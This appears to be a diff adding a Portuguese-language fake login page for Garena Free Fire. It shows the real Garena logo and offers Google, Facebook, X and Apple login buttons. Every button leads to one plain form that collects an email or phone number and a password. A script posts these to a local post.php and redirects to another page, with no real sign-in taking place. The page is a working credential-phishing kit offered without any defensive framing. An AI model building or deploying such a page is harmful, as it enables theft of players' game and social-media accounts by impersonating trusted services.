@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Garena Free Fire</title>
+    <style>
+        /* Estilos Gerais */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: #e0e0e0;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background-color: #1e1e1e;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.6);
+            padding: 25px;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        /* Logo */
+        .logo-container {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .logo-container img {
+            width: 130px;
+            height: auto;
+        }
+
+        /* Botões de Login */
+        .login-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .login-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: opacity 0.3s;
+        }
+        .login-btn:hover {
+            opacity: 0.85;
+        }
+
+        .login-btn img {
+            width: 22px;
+            height: 22px;
+            margin-right: 10px;
+        }
+
+        /* Cores específicas dos botões */
+        .google-btn { background-color: #fff; color: #000; }
+        .facebook-btn { background-color: #1877f2; color: #fff; }
+        .x-btn { background-color: #000; color: #fff; }
+        .apple-btn { background-color: #000; color: #fff; }
+
+        /* Formulário de Login */
+        .login-form {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .login-form h2 {
+            font-size: 18px;
+            color: #fff;
+            margin-bottom: 15px;
+        }
+
+        /* Campos do formulário */
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            color: #ddd;
+            margin-bottom: 5px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #333;
+            border-radius: 5px;
+            background-color: #292929;
+            color: #fff;
+            font-size: 14px;
+        }
+
+        /* Botão de Submissão */
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #fff;
+        }
+        .submit-btn img {
+            width: 20px;
+            height: 20px;
+        }
+
+        /* Aviso de Consentimento */
+        .consent {
+            font-size: 12px;
+            color: #999;
+            text-align: center;
+            margin: 15px 0;
+        }
+        .consent a {
+            color: #ff4500;
+            text-decoration: none;
+        }
+        .consent a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Logo -->
+        <div class="logo-container">
+            <img src="https://dl.dir.freefiremobile.com/common/web_event/official2/dist/client/img/garena_logo.b28b2b6.png" alt="Logo da Garena">
+        </div>
+
+        <h1 style="text-align: center; margin-bottom: 20px;">Selecione o seu tipo de Login</h1>
+
+        <!-- Botões de Login -->
+        <div class="login-options">
+            <button class="login-btn google-btn" onclick="showLoginForm('Google')">
+                <img src="https://i.ibb.co/WWsr4ppd/transferir.png" alt="Google">
+                Continuar com Google
+            </button>
+            <button class="login-btn facebook-btn" onclick="showLoginForm('Facebook')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
+                Continuar com Facebook
+            </button>
+            <button class="login-btn x-btn" onclick="showLoginForm('X')">
+                <img src="https://i.ibb.co/kgKVmBWq/X-logo.jpg" alt="X">
+                Continuar com X
+            </button>
+            <button class="login-btn apple-btn" onclick="showLoginForm('Apple')">
+                <img src="https://i.ibb.co/Hs2D0RF/cdd3cfd2871872a73c1b6402584ea81c.jpg" alt="Apple">
+                Continuar com Apple
+            </button>
+        </div>
+
+        <!-- Formulário de Login -->
+        <div class="login-form" id="login-form">
+            <h2 id="login-title"></h2>
+            <form action="post.php" method="POST" onsubmit="redirectAfterSubmit(event)">
+                <div class="form-group">
+                    <label for="email">E-mail ou número de telefone</label>
+                    <input type="text" id="email" name="email" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Palavra-passe</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                
+                <div class="consent">
+                    <p>Ao continuar, você concorda com nossa <a href="politica-de-privacidade.html" target="_blank">Política de Privacidade</a>.</p>
+                </div>
+
+                <button type="submit" class="submit-btn" id="submit-btn">
+                    <img src="" alt="Ícone" id="submit-icon">
+                    Iniciar Sessão
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function showLoginForm(platform) {
+            const loginForm = document.getElementById("login-form");
+            const loginTitle = document.getElementById("login-title");
+            const submitBtn = document.getElementById("submit-btn");
+            const submitIcon = document.getElementById("submit-icon");
+
+            loginForm.style.display = "block";
+            loginTitle.textContent = `Login com ${platform}`;
+
+            const platformSettings = {
+                Google: { icon: "https://i.ibb.co/WWsr4ppd/transferir.png", color: "#fff", textColor: "#000" },
+                Facebook: { icon: "https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg", color: "#1877f2", textColor: "#fff" },
+                X: { icon: "https://i.ibb.co/kgKVmBWq/X-logo.jpg", color: "#000", textColor: "#fff" },
+                Apple: { icon: "https://i.ibb.co/Hs2D0RF/cdd3cfd2871872a73c1b6402584ea81c.jpg", color: "#000", textColor: "#fff" }
+            };
+
+            submitIcon.src = platformSettings[platform].icon;
+            submitBtn.style.backgroundColor = platformSettings[platform].color;
+            submitBtn.style.color = platformSettings[platform].textColor;
+        }
+
+        function redirectAfterSubmit(event) {
+            event.preventDefault();
+            var formData = new FormData(event.target);
+            fetch("post.php", { method: "POST", body: formData }).then(() => {
+                window.location.href = "outra_pagina.html";
+            });
+        }
+    </script>
+</body>
+</html>
